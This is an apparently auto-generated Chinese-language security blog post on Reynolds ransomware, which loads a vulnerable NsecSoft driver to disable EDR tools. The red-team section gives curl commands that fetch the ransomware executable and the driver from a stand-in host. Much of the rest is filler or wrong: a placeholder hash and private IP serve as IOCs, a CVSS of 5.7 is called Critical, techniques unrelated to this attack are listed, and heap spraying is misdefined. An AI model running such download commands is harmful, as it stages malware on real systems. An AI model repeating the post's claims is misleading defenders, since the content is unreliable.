---
layout: post
title:  "Reynolds Ransomware Embeds BYOVD Driver to Disable EDR Security Tools"
date:   2026-02-10 18:58:16 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Reynolds 勒索軟體的防禦繞過技術
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS 分數：5.7)
> * **受駭指標**: LPE (Local Privilege Escalation)
> * **關鍵技術**: BYOVD (Bring Your Own Vulnerable Driver), Heap Spraying, Deserialization

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Reynolds 勒索軟體利用了一個名為 NsecSoft NSecKrnl 的驅動程式，該驅動程式存在一個已知的安全漏洞 (CVE-2025-68947)，允許攻擊者終止任意進程。
* **攻擊流程圖解**:
  1. 攻擊者將 Reynolds 勒索軟體和 NsecSoft NSecKrnl 驅動程式一起下載到目標系統。
  2. 勒索軟體啟動並載入 NsecSoft NSecKrnl 驅動程式。
  3. 驅動程式利用 CVE-2025-68947 漏洞終止安全軟體的進程。
  4. 勒索軟體開始加密系統上的檔案。
* **受影響元件**: NsecSoft NSecKrnl 驅動程式，版本號：未指定。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要有系統管理員權限。
* **Payload 建構邏輯**:

    ```
    
    python
      # Reynolds 勒索軟體的 payload 結構
      payload = {
        'driver': 'NsecSoft NSecKrnl',
        'exploit': 'CVE-2025-68947',
        'encryption': 'AES-256-CBC'
      }
    
    ```
  *範例指令*：使用 `curl` 下載 Reynolds 勒索軟體和 NsecSoft NSecKrnl 驅動程式。

```

bash
  curl -o reynolds.exe https://example.com/reynolds.exe
  curl -o nsecsoft_nseckrnl.sys https://example.com/nsecsoft_nseckrnl.sys

```
* **繞過技術**: Reynolds 勒索軟體使用 NsecSoft NSecKrnl 驅動程式來繞過安全軟體的檢測。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | C:\Windows\System32\drivers\nsecsoft_nseckrnl.sys |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
      rule Reynolds_Ransomware {
        meta:
          description = "Reynolds 勒索軟體"
          author = "Your Name"
        strings:
          $a = "NsecSoft NSecKrnl"
          $b = "CVE-2025-68947"
        condition:
          all of them
      }
    
    ```
  或者是使用 Snort/Suricata Signature：

```

snort
  alert tcp any any -> any any (msg:"Reynolds Ransomware"; content:"NsecSoft NSecKrnl"; sid:1000001;)

```
* **緩解措施**: 更新 NsecSoft NSecKrnl 驅動程式至最新版本，禁用未使用的驅動程式，使用安全軟體進行實時監控。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **BYOVD (Bring Your Own Vulnerable Driver)**: 一種攻擊技術，利用已知的安全漏洞來繞過安全軟體的檢測。
* **Heap Spraying**: 一種攻擊技術，利用堆疊溢位來執行任意代碼。
* **Deserialization**: 一種攻擊技術，利用序列化和反序列化來執行任意代碼。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/02/reynolds-ransomware-embeds-byovd-driver.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1543/)


